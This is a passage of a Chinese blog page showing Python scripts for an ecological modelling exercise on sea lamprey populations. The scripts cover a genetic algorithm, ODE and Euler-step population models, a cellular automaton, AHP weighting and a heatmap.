fitness[max_fitness_index])</span><br><span class=\"line\">    x, y = translateDNA(pop)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;最优的基因型：&quot;</span>, pop[max_fitness_index])</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;(x, y):&quot;</span>, (x[max_fitness_index], y[max_fitness_index]))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    fig = plt.figure()</span><br><span class=\"line\">    ax = Axes3D(fig)</span><br><span class=\"line\">    plt.ion()  <span class=\"comment\"># 将画图模式改为交互模式，程序遇到plt.show不会暂停，而是继续执行</span></span><br><span class=\"line\">    plot_3d(ax)</span><br><span class=\"line\"></span><br><span class=\"line\">    pop = np.random.randint(<span class=\"number\">2</span>, size=(POP_SIZE, DNA_SIZE * <span class=\"number\">2</span>))  <span class=\"comment\"># matrix (POP_SIZE, DNA_SIZE)</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(N_GENERATIONS):  <span class=\"comment\"># 迭代N代</span></span><br><span class=\"line\">        x, y = translateDNA(pop)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&#x27;sca&#x27;</span> <span class=\"keyword\">in</span> <span class=\"built_in\">locals</span>():</span><br><span class=\"line\">            sca.remove()</span><br><span class=\"line\">        sca = ax.scatter(x, y, F(x, y), c=<span class=\"string\">&#x27;black&#x27;</span>, marker=<span class=\"string\">&#x27;o&#x27;</span>);</span><br><span class=\"line\">        plt.show();</span><br><span class=\"line\">        plt.pause(<span class=\"number\">0.1</span>)</span><br><span class=\"line\">        pop = np.array(crossover_and_mutation(pop, CROSSOVER_RATE))</span><br><span class=\"line\">        <span class=\"comment\"># F_values = F(translateDNA(pop)[0], translateDNA(pop)[1])#x, y --&gt; Z matrix</span></span><br><span class=\"line\">        fitness = get_fitness(pop)</span><br><span class=\"line\">        pop = select(pop, fitness)  <span class=\"comment\"># 选择生成新的种群</span></span><br><span class=\"line\"></span><br><span class=\"line\">    print_info(pop)</span><br><span class=\"line\">    plt.ioff()</span><br><span class=\"line\">    plot_3d(ax)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"intgr\"><a class=\"anchor\" href=\"#intgr\">#</a> intgr</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> scipy <span class=\"keyword\">import</span> integrate</span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Logistic</span>(<span class=\"params\">y,t,para</span>):</span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    Na     : Sum Adult</span></span><br><span class=\"line\"><span class=\"string\">    Nf     : Female</span></span><br><span class=\"line\"><span class=\"string\">    Nm     : Male</span></span><br><span class=\"line\"><span class=\"string\">    Nc     : Cub(No Gender)</span></span><br><span class=\"line\"><span class=\"string\">    N_Fresh: Predator in Fresh Water</span></span><br><span class=\"line\"><span class=\"string\">    N_Sea  : Prey in Sea Water</span></span><br><span class=\"line\"><span class=\"string\">    Alpha1 : Cub Natural mortality rate</span></span><br><span class=\"line\"><span class=\"string\">    Alpha2 : Sea Natural growth rate</span></span><br><span class=\"line\"><span class=\"string\">    Beta1  : Fresh Natural mortality rate</span></span><br><span class=\"line\"><span class=\"string\">    Beta2  : Adult Natural mortality rate</span></span><br><span class=\"line\"><span class=\"string\">    Gamma1 : Fresh Predation rate</span></span><br><span class=\"line\"><span class=\"string\">    Gamma2 : Sea Predation rate</span></span><br><span class=\"line\"><span class=\"string\">    Rou1   : Female immigration/emigration rate</span></span><br><span class=\"line\"><span class=\"string\">    Rou2   : Male immigration/emigration rate</span></span><br><span class=\"line\"><span class=\"string\">    e1,e2  : correction factor</span></span><br><span class=\"line\"><span class=\"string\">    S      : </span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\">    Nf,Nm,Nc,N_Fresh,N_Sea = y</span><br><span class=\"line\">    Na = Nf + Nm</span><br><span class=\"line\">    Alpha1,Alpha2,Beta1,Beta2,Gamma1,Gamma2,Rou1,Rou2,e1,e2,S,k = para</span><br><span class=\"line\">    dNcdt = k * Nf - Alpha1 * Nc - Gamma1 * Nc * N_Fresh - (Rou1 + Rou2) * Nc * S</span><br><span class=\"line\">    dNFreshdt = -Beta1 * N_Fresh + e1 * Gamma1 * Nc * N_Fresh</span><br><span class=\"line\">    dNSeadt = Alpha2 * N_Sea - Gamma2 * N_Sea * Na</span><br><span class=\"line\">    <span class=\"comment\">#dNadt = (rou1 + rou2) * Nc * S - Beta2 * Na + e2 * Gamma2 * N_Sea * Na</span></span><br><span class=\"line\">    dNfdt = Rou1 * Nc * S - Beta2 * Nf + e2 * Gamma2 * N_Sea * Nf</span><br><span class=\"line\">    dNmdt = Rou2 * Nc * S - Beta2 * Nm + e1 * Gamma1 * N_Sea * Nm</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [dNfdt,dNmdt,dNcdt,dNFreshdt,dNSeadt]</span><br><span class=\"line\">t = np.linspace(<span class=\"number\">0</span>,<span class=\"number\">2000</span>,<span class=\"number\">2000</span>)</span><br><span class=\"line\">paras = ( </span><br><span class=\"line\">    <span class=\"number\">0.1</span>,<span class=\"number\">0.04</span>,</span><br><span class=\"line\">    <span class=\"number\">0.04</span>,<span class=\"number\">0.005</span>,</span><br><span class=\"line\">    <span class=\"number\">0.00005</span>,<span class=\"number\">8E-7</span>,</span><br><span class=\"line\">    <span class=\"number\">0.2</span>,<span class=\"number\">0.8</span>,</span><br><span class=\"line\">    <span class=\"number\">0.1</span>,<span class=\"number\">0.01</span>,</span><br><span class=\"line\">    <span class=\"number\">0.01</span>,</span><br><span class=\"line\">    <span class=\"number\">2</span></span><br><span class=\"line\">)</span><br><span class=\"line\">y = integrate.odeint(Logistic, [<span class=\"number\">20</span>,<span class=\"number\">2</span>,<span class=\"number\">300</span>,<span class=\"number\">1</span>,<span class=\"number\">100</span>], t,args=(paras,))</span><br><span class=\"line\">plt.plot(t, y[:,<span class=\"number\">0</span>]+y[:,<span class=\"number\">1</span>]+y[:,<span class=\"number\">2</span>]) <span class=\"comment\">#Group Population</span></span><br><span class=\"line\"><span class=\"comment\">#plt.plot(t, y[:,1]/y[:,0]) #Sex ratio</span></span><br><span class=\"line\">plt.show()</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"遗传模型\"><a class=\"anchor\" href=\"#遗传模型\">#</a> 遗传模型</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 参数设定</span></span><br><span class=\"line\">r_M = <span class=\"number\">0.04</span>  <span class=\"comment\"># 雄性海七鳃鳗的繁殖率</span></span><br><span class=\"line\">d_M = <span class=\"number\">0.02</span>  <span class=\"comment\"># 雄性海七鳃鳗的自然死亡率</span></span><br><span class=\"line\">b_M = <span class=\"number\">0.002</span> <span class=\"comment\"># 雄性海七鳃鳗的捕食效率</span></span><br><span class=\"line\"></span><br><span class=\"line\">r_F = <span class=\"number\">0.03</span>  <span class=\"comment\"># 雌性海七鳃鳗的繁殖率</span></span><br><span class=\"line\">d_F = <span class=\"number\">0.02</span>  <span class=\"comment\"># 雌性海七鳃鳗的自然死亡率</span></span><br><span class=\"line\">b_F = <span class=\"number\">0.001</span> <span class=\"comment\"># 雌性海七鳃鳗的捕食效率</span></span><br><span class=\"line\"></span><br><span class=\"line\">r_P = <span class=\"number\">0.1</span>   <span class=\"comment\"># 猎物的自然增长率</span></span><br><span class=\"line\">a = <span class=\"number\">0.001</span>    <span class=\"comment\"># 猎物被捕食的概率</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 初始条件</span></span><br><span class=\"line\">M0 = <span class=\"number\">78</span>   <span class=\"comment\"># 雄性海七鳃鳗的初始种群数量</span></span><br><span class=\"line\">F0 = <span class=\"number\">22</span>   <span class=\"comment\"># 雌性海七鳃鳗的初始种群数量</span></span><br><span class=\"line\">P0 = <span class=\"number\">300</span>   <span class=\"comment\"># 猎物的初始种群数量</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 时间设定</span></span><br><span class=\"line\">dt = <span class=\"number\">0.05</span>  <span class=\"comment\"># 时间步长</span></span><br><span class=\"line\">T = <span class=\"number\">100</span>    <span class=\"comment\"># 总模拟时间</span></span><br><span class=\"line\">N = <span class=\"built_in\">int</span>(T / dt) <span class=\"comment\"># 总步数</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 初始化数组</span></span><br><span class=\"line\">M = np.zeros(N)</span><br><span class=\"line\">F = np.zeros(N)</span><br><span class=\"line\">P = np.zeros(N)</span><br><span class=\"line\">M[<span class=\"number\">0</span>] = M0</span><br><span class=\"line\">F[<span class=\"number\">0</span>] = F0</span><br><span class=\"line\">P[<span class=\"number\">0</span>] = P0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 模拟过程</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(N - <span class=\"number\">1</span>):</span><br><span class=\"line\">    M[t + <span class=\"number\">1</span>] = M[t] + (r_M * M[t] - d_M * M[t] + b_M * a * P[t] * M[t]) * dt</span><br><span class=\"line\">    F[t + <span class=\"number\">1</span>] = F[t] + (r_F * F[t] - d_F * F[t] + b_F * a * P[t] * F[t]) * dt</span><br><span class=\"line\">    P[t + <span class=\"number\">1</span>] = P[t] + (r_P * P[t] - a * P[t] * (M[t] + F[t])) * dt</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 绘图</span></span><br><span class=\"line\">time = np.linspace(<span class=\"number\">0</span>, T, N)</span><br><span class=\"line\">plt.figure(figsize=(<span class=\"number\">12</span>, <span class=\"number\">6</span>))</span><br><span class=\"line\">plt.plot(time, M, label=<span class=\"string\">&#x27;Male Sea Lampreys&#x27;</span>, color=<span class=\"string\">&#x27;blue&#x27;</span>)</span><br><span class=\"line\">plt.plot(time, F, label=<span class=\"string\">&#x27;Female Sea Lampreys&#x27;</span>, color=<span class=\"string\">&#x27;red&#x27;</span>)</span><br><span class=\"line\">plt.plot(time, P, label=<span class=\"string\">&#x27;Prey&#x27;</span>, color=<span class=\"string\">&#x27;grey&#x27;</span>)</span><br><span class=\"line\">plt.xlabel(<span class=\"string\">&#x27;Time&#x27;</span>)</span><br><span class=\"line\">plt.ylabel(<span class=\"string\">&#x27;Population&#x27;</span>)</span><br><span class=\"line\">plt.title(<span class=\"string\">&#x27;Structured Population Model Simulation&#x27;</span>)</span><br><span class=\"line\">plt.legend()</span><br><span class=\"line\">plt.show()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"元胞自动机\"><a class=\"anchor\" href=\"#元胞自动机\">#</a> 元胞自动机</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 定义格子大小</span></span><br><span class=\"line\">grid_size = (<span class=\"number\">1000</span>, <span class=\"number\">1000</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 初始状态</span></span><br><span class=\"line\">initial_bacteria = <span class=\"number\">100</span></span><br><span class=\"line\">initial_grass = <span class=\"number\">50</span></span><br><span class=\"line\">initial_host = <span class=\"number\">1</span></span><br><span class=\"line\">initial_male_eels = <span class=\"number\">20</span>  <span class=\"comment\"># 修改为雄性20</span></span><br><span class=\"line\">initial_female_eels = <span class=\"number\">5</span>  <span class=\"comment\"># 修改为雌性5</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 繁殖率</span></span><br><span class=\"line\">bacteria_reproduction_rate = <span class=\"number\">2.0</span></span><br><span class=\"line\">grass_reproduction_rate = <span class=\"number\">1.0</span></span><br><span class=\"line\">eels_reproduction_rate = <span class=\"number\">0.0</span>  <span class=\"comment\"># 初始时七鳃鳗数量不变</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 人类捕捉比例</span></span><br><span class=\"line\">human_capture_rate = np.random.uniform(<span class=\"number\">0.3</span>, <span class=\"number\">0.6</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 迭代次数</span></span><br><span class=\"line\">iterations = <span class=\"number\">20</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 初始化格子</span></span><br><span class=\"line\">grid = np.zeros(grid_size)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 初始化各个生物的位置</span></span><br><span class=\"line\">grid[:initial_bacteria] = <span class=\"number\">1</span>  <span class=\"comment\"># 细菌</span></span><br><span class=\"line\">grid[initial_bacteria:initial_bacteria + initial_grass] = <span class=\"number\">2</span>  <span class=\"comment\"># 草</span></span><br><span class=\"line\">grid[-initial_host:] = <span class=\"number\">3</span>  <span class=\"comment\"># 宿主</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 初始化七鳃鳗的位置和性别</span></span><br><span class=\"line\">grid[np.random.choice(grid_size[<span class=\"number\">0</span>], initial_male_eels, replace=<span class=\"literal\">False</span>)] = <span class=\"number\">4</span>  <span class=\"comment\"># 男性七鳃鳗</span></span><br><span class=\"line\">grid[np.random.choice(grid_size[<span class=\"number\">0</span>], initial_female_eels, replace=<span class=\"literal\">False</span>)] = <span class=\"number\">5</span>  <span class=\"comment\"># 女性七鳃鳗</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 定义函数来执行一代的更新</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">update</span>(<span class=\"params\">grid</span>):</span><br><span class=\"line\">    new_grid = np.zeros_like(grid)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(grid_size[<span class=\"number\">0</span>]):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(grid_size[<span class=\"number\">1</span>]):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> grid[i, j] == <span class=\"number\">1</span>:  <span class=\"comment\"># 细菌</span></span><br><span class=\"line\">                new_grid[i, j] = <span class=\"number\">1</span> <span class=\"keyword\">if</span> np.random.rand() &lt; bacteria_reproduction_rate <span class=\"keyword\">else</span> <span class=\"number\">0</span></span><br><span class=\"line\">            <span class=\"keyword\">elif</span> grid[i, j] == <span class=\"number\">2</span>:  <span class=\"comment\"># 草</span></span><br><span class=\"line\">                new_grid[i, j] = <span class=\"number\">2</span> <span class=\"keyword\">if</span> np.random.rand() &lt; grass_reproduction_rate <span class=\"keyword\">else</span> <span class=\"number\">0</span></span><br><span class=\"line\">            <span class=\"keyword\">elif</span> grid[i, j] == <span class=\"number\">3</span>:  <span class=\"comment\"># 宿主</span></span><br><span class=\"line\">                new_grid[i, j] = <span class=\"number\">3</span></span><br><span class=\"line\">            <span class=\"keyword\">elif</span> grid[i, j] == <span class=\"number\">4</span> <span class=\"keyword\">or</span> grid[i, j] == <span class=\"number\">5</span>:  <span class=\"comment\"># 七鳃鳗</span></span><br><span class=\"line\">                new_grid[i, j] = grid[i, j]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> new_grid</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 迭代模型</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(iterations):</span><br><span class=\"line\">    grid = update(grid)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 绘制结果</span></span><br><span class=\"line\">plt.imshow(grid, cmap=<span class=\"string\">&#x27;viridis&#x27;</span>)</span><br><span class=\"line\">plt.title(<span class=\"string\">&quot;Cellular Automaton after 20 iterations&quot;</span>)</span><br><span class=\"line\">plt.show()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"层次权重\"><a class=\"anchor\" href=\"#层次权重\">#</a> 层次权重</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 假设 A 是判断矩阵，每列代表一个因素</span></span><br><span class=\"line\">A = np.array([</span><br><span class=\"line\">    [<span class=\"number\">1</span>, <span class=\"number\">7</span>, <span class=\"number\">7</span>, <span class=\"number\">7</span>, <span class=\"number\">7</span>, <span class=\"number\">7</span>, <span class=\"number\">7</span>],</span><br><span class=\"line\">    [<span class=\"number\">1</span>/<span class=\"number\">7</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>],</span><br><span class=\"line\">    [<span class=\"number\">1</span>/<span class=\"number\">7</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>],</span><br><span class=\"line\">    [<span class=\"number\">1</span>/<span class=\"number\">7</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>],</span><br><span class=\"line\">    [<span class=\"number\">1</span>/<span class=\"number\">7</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>],</span><br><span class=\"line\">    [<span class=\"number\">1</span>/<span class=\"number\">7</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>],</span><br><span class=\"line\">    [<span class=\"number\">1</span>/<span class=\"number\">7</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>]</span><br><span class=\"line\">])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 计算权重</span></span><br><span class=\"line\">eigenvalues, eigenvectors = np.linalg.eig(A)</span><br><span class=\"line\">weights = eigenvectors[:, np.argmax(eigenvalues)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 归一化权重</span></span><br><span class=\"line\">weights /= <span class=\"built_in\">sum</span>(weights)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 假设有三个情况，每个情况在层次结构的权重</span></span><br><span class=\"line\">case_weights = np.array([</span><br><span class=\"line\">    [<span class=\"number\">0.2</span>, <span class=\"number\">0.3</span>, <span class=\"number\">0.5</span>],</span><br><span class=\"line\">    [<span class=\"number\">0.4</span>, <span class=\"number\">0.4</span>, <span class=\"number\">0.2</span>],</span><br><span class=\"line\">    [<span class=\"number\">0.1</span>, <span class=\"number\">0.5</span>, <span class=\"number\">0.4</span>]</span><br><span class=\"line\">])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 计算每个情况的总排序分数</span></span><br><span class=\"line\">total_scores = np.<span class=\"built_in\">sum</span>(case_weights * weights, axis=<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 排序结果</span></span><br><span class=\"line\">sorted_indices = np.argsort(total_scores)[::-<span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 输出排序结果</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> idx, score <span class=\"keyword\">in</span> <span class=\"built_in\">zip</span>(sorted_indices, total_scores[sorted_indices]):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;情况 <span class=\"subst\">&#123;idx+<span class=\"number\">1</span>&#125;</span>: 总排序分数 <span class=\"subst\">&#123;score&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"热力图生成\"><a class=\"anchor\" href=\"#热力图生成\">#</a> 热力图生成</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> seaborn <span class=\"keyword\">as</span> sns</span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"><span class=\"keyword\">import</span> pandas <span class=\"keyword\">as</span> pd</span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Prepare the data in DataFrame</span></span><br><span class=\"line\">data = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;Natural and Anthropogenic Factors&#x27;</span>: [<span class=\"number\">0.998053414</span>, <span class=\"number\">1.124388586</span>, <span class=\"number\">0.505350047</span>],</span><br><span class=\"line\">    <span class=\"string\">&#x27;Food Abundance&#x27;</span>: [<span class=\"number\">0.010752428</span>, <span class=\"number\">0.004509764</span>, <span class=\"number\">0.000233752</span>],</span><br><span class=\"line\">    <span class=\"string\">&#x27;Hatching Environment Conditions&#x27;</span>: [<span class=\"number\">0.006704276</span>, <span class=\"number\">6.56459E-06</span>, <span class=\"number\">0.000756631</span>],</span><br><span class=\"line\">    <span class=\"string\">&#x27;Influence of Other Organisms in Water&#x27;</span>: [<span class=\"number\">2.83968E-08</span>, <span class=\"number\">3.19914E-08</span>, <span class=\"number\">3.24933E-10</span>],</span><br><span class=\"line\">    <span class=\"string\">&#x27;Seasonal Changes&#x27;</span>: [<span class=\"number\">1.07524E-05</span>, <span class=\"number\">0.004509764</span>, <span class=\"number\">3.33414E-06</span>],</span><br><span class=\"line\">    <span class=\"string\">&#x27;Water Quality Conditions&#x27;</span>: [<span class=\"number\">0.006704276</span>, <span class=\"number\">6.56459E-06</span>, <span class=\"number\">0.000756631</span>],</span><br><span class=\"line\">    <span class=\"string\">&#x27;Temperature Influence&#x27;</span>: [<span class=\"number\">1.07524E-05</span>, <span class=\"number\">0.004509764</span>, <span class=\"number\">3.33414E-06</span>]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">index = [<span class=\"string\">&#x27;Population Size&#x27;</span>, <span class=\"string\">&#x27;Gender 